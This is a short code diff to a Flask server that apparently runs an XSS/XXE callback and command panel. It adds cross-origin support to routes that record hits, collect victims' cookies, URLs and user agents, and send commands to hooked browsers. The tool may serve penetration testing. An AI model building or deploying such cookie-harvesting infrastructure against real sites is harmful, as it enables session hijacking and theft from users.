@@ -2,6 +2,7 @@
 
 from flask import Blueprint, render_template, request, send_from_directory, flash
 from flask_login import login_required
+from flask_cors import CORS, cross_origin
 from . import db, config
 from .models import XSS, Interact
 import uuid
@@ -41,6 +42,7 @@ def generate_unique():
 
 # new xss/xxe found, store it inside the db: stage_1
 @main.route(config["main_endpoint"] + '/<path:xxx>/<path:random_str>', methods=['GET'])
+@cross_origin()
 def new_xxx(xxx, random_str):
     def delete_file_once_downloaded(filename):
         sleep(5)
@@ -103,6 +105,7 @@ def new_xxx(xxx, random_str):
 
 # grab cookie, url, user-agent uid after stage_2
 @main.route(config["main_endpoint"] + config["stage_2_init_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
+@cross_origin()
 def grab_info(xxx_uid):
     # POST's content is a json base64 encoded
     #{url': 'url', 'cookie': 'cookie'} = eyJ1aWQiOiAiMTIzNDUiLCAidXJsIjogInVybCIsICJjb29raWUiOiAiY29va2llIn0=
@@ -151,6 +154,7 @@ def grab_info(xxx_uid):
 
 # stage 2 send cmd
 @main.route(config["main_endpoint"] + config["stage_2_cmd_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
+@cross_origin()
 def send_cmd(xxx_uid):
     if xxx_uid == "":
         return render_template('index.html')
@@ -200,6 +204,7 @@ def send_cmd(xxx_uid):
 
 # stage 2 interaction
 @main.route(config["main_endpoint"] + config["stage_2_interact_endpoint"] + '/<path:xxx_uid>', methods=['GET'])
+@cross_origin()
 def interact(xxx_uid):
     if xxx_uid == "":
         return render_template('index.html')
